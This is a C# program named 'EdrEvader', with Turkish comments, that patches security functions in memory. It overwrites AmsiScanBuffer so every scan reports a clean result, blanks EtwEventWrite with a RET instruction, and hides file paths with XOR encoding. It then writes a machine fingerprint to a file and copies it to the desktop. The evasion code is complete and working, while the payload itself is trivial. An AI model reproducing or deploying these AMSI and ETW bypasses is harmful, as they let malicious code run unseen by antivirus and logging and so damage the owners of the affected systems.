using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace EdrEvader
{
    internal static class NativeMethods
    {
        // kernel32: memory
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
            uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule,
            [MarshalAs(UnmanagedType.LPStr)] string lpProcName);

        // kernel32: files
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr CreateFile(string lpFileName,
            uint dwDesiredAccess, uint dwShareMode,
            IntPtr lpSecurityAttributes, uint dwCreationDisposition,
            uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer,
            uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CopyFile(string lpExistingFileName,
            string lpNewFileName, bool bFailIfExists);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        // constants
        public const uint PAGE_EXECUTE_READWRITE = 0x40;
        public const uint PAGE_READWRITE         = 0x04;
        public const uint GENERIC_WRITE          = 0x40000000;
        public const uint CREATE_ALWAYS          = 2;
        public const uint FILE_ATTRIBUTE_NORMAL  = 0x80;
    }

    internal static class Program
    {
        private const byte XorKey = 0x5A;

        static void Main()
        {
            // KATMAN 1: AMSI patch — AmsiScanBuffer'a mov eax,0; ret
            PatchAmsi();

            // KATMAN 2: ETW patch — EtwEventWrite'a ret (C3)
            PatchEtw();

            // KATMAN 3: XOR-obfuscated strings
            string rootPath  = XorDecode(
                new byte[] { 25, 96, 6, 46, 63, 55, 42 }, XorKey);
            string fileName  = XorDecode(
                new byte[] { 41, 35, 41, 55, 53, 52, 5, 62, 59, 46, 59, 116, 46, 34, 46 }, XorKey);
            string deskName  = XorDecode(
                new byte[] { 41, 35, 41, 55, 53, 52, 5, 62, 59, 46, 59, 116, 46, 34, 46 }, XorKey);

            string fullRootPath = rootPath + @"\" + fileName;

            // KATMAN 4: Win32 API ile dosya oluştur — .NET managed I/O yok
            IntPtr hFile = NativeMethods.CreateFile(fullRootPath,
                NativeMethods.GENERIC_WRITE, 0, IntPtr.Zero,
                NativeMethods.CREATE_ALWAYS, NativeMethods.FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);

            if (hFile == (IntPtr)(-1) || hFile == IntPtr.Zero)
            {
                Console.WriteLine("[!] CreateFile failed: " +
                    new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
                return;
            }

            try
            {
                string payload = "[EDR Evader] System fingerprint captured: " +
                    Environment.MachineName + " | " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                byte[] data = Encoding.UTF8.GetBytes(payload);

                if (!NativeMethods.WriteFile(hFile, data, (uint)data.Length,
                        out uint written, IntPtr.Zero))
                {
                    Console.WriteLine("[!] WriteFile failed: " +
                        new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
                    return;
                }

                Console.WriteLine("[+] Written " + written + " bytes to " + fullRootPath);
            }
            finally
            {
                NativeMethods.CloseHandle(hFile);
            }

            // KATMAN 5: Desktop'a kopyala
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
            string fullDeskPath = desktopPath + @"\" + deskName;

            if (NativeMethods.CopyFile(fullRootPath, fullDeskPath, false))
            {
                Console.WriteLine("[+] Copied to desktop: " + fullDeskPath);
            }
            else
            {
                Console.WriteLine("[!] CopyFile failed: " +
                    new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
            }
        }

        // ──────────────────────────────────────────────────────
        // AMSI Patch — AmsiScanBuffer'ı devre dışı bırak
        // ──────────────────────────────────────────────────────
        static void PatchAmsi()
        {
            try
            {
                IntPtr hAmsi = NativeMethods.GetModuleHandle("amsi.dll");
                if (hAmsi == IntPtr.Zero) return; // AMSI yüklü değil

                IntPtr pAmsiScanBuffer = NativeMethods.GetProcAddress(hAmsi, "AmsiScanBuffer");
                if (pAmsiScanBuffer == IntPtr.Zero) return;

                // mov eax, 0x00005700 ; ret
                // = AMSI_RESULT_CLEAN döndür, her şey temiz görünsün
                byte[] patch = new byte[] {
                    0xB8,       // mov eax, imm32
                    0x00, 0x57, 0x00, 0x00,  // 0x00005700 = AMSI_RESULT_CLEAN
                    0xC3        // ret
                };

                // Sayfa korumasını RWX yap
                if (!NativeMethods.VirtualProtect(pAmsiScanBuffer,
                        (UIntPtr)patch.Length,
                        NativeMethods.PAGE_EXECUTE_READWRITE,
                        out uint oldProtect))
                {
                    Console.WriteLine("[!] VirtualProtect (AMSI) failed: " +
                        new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
                    return;
                }

                // Patch'i yaz
                Marshal.Copy(patch, 0, pAmsiScanBuffer, patch.Length);

                // Eski korumayı geri yükle (opsiyonel, ama temiz)
                NativeMethods.VirtualProtect(pAmsiScanBuffer,
                    (UIntPtr)patch.Length, oldProtect, out _);

                Console.WriteLine("[+] AMSI patched: AmsiScanBuffer -> AMSI_RESULT_CLEAN");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] PatchAmsi exception: " + ex.Message);
            }
        }

        // ──────────────────────────────────────────────────────
        // ETW Patch — EtwEventWrite'ı devre dışı bırak
        // ──────────────────────────────────────────────────────
        static void PatchEtw()
        {
            try
            {
                IntPtr hNtdll = NativeMethods.GetModuleHandle("ntdll.dll");
                if (hNtdll == IntPtr.Zero) return;

                IntPtr pEtwEventWrite = NativeMethods.GetProcAddress(hNtdll, "EtwEventWrite");
                if (pEtwEventWrite == IntPtr.Zero) return;

                // Tek byte: ret (0xC3) — EtwEventWrite hiçbir şey yapmadan dönsün
                byte[] patch = new byte[] { 0xC3 };

                if (!NativeMethods.VirtualProtect(pEtwEventWrite,
                        (UIntPtr)patch.Length,
                        NativeMethods.PAGE_EXECUTE_READWRITE,
                        out uint oldProtect))
                {
                    Console.WriteLine("[!] VirtualProtect (ETW) failed: " +
                        new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
                    return;
                }

                Marshal.Copy(patch, 0, pEtwEventWrite, patch.Length);

                NativeMethods.VirtualProtect(pEtwEventWrite,
                    (UIntPtr)patch.Length, oldProtect, out _);

                Console.WriteLine("[+] ETW patched: EtwEventWrite -> RET");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] PatchEtw exception: " + ex.Message);
            }
        }

        // ──────────────────────────────────────────────────────
        // XOR String Decoder
        // ──────────────────────────────────────────────────────
        static string XorDecode(byte[] encoded, byte key)
        {
            byte[] raw = new byte[encoded.Length];
            for (int i = 0; i < encoded.Length; i++)
                raw[i] = (byte)(encoded[i] ^ key);
            return Encoding.UTF8.GetString(raw);
        }
    }
}
